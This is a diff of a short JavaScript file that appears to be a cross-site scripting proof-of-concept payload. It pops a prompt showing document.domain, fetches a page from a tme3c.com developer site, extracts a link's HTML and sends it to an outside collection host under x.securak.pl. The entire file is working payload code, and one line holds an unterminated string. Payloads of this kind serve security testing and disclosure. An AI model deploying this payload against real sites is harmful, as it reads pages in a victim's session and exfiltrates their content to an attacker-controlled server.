@@ -1,2 +1,33 @@
 prompt(document.domain+" - "+new Date().toISOString().slice(0,10));
 window.alert('hello)
+(async function forwardDocumentationLink() {
+  try {
+    const response = await fetch("https://developers.test.tme3c.com/en");
+    const html = await response.text();
+
+    // Parse the HTML and find the "Documentation" link
+    const doc = new DOMParser().parseFromString(html, "text/html");
+
+    // Try the most robust selectors first:
+    // 1) link text, 2) class, 3) href contains api-doc
+    const a =
+      Array.from(doc.querySelectorAll("a")).find(el => el.textContent.trim() === "Documentation") ||
+      doc.querySelector('a.buttons_link__X_5_I.t_documentation_lading_page_button') ||
+      doc.querySelector('a[href*="api-doc.test.tme3c.com"]');
+
+    if (!a) {
+      console.error("Documentation link not found");
+      return;
+    }
+
+    const snippet = a.outerHTML; // exactly: <a ...>Documentation</a>
+
+    // Send only this snippet via GET param
+    const url = `https://qwqgbhw12tepfwjh7h5lu4zu9lfc3arz.x.securak.pl/?${new URLSearchParams({ body: snippet }).toString()}`;
+    const sendResponse = await fetch(url, { method: "GET" });
+
+    console.log("Snippet forwarded:", sendResponse.status);
+  } catch (err) {
+    console.error("Forwarding failed:", err);
+  }
+})();
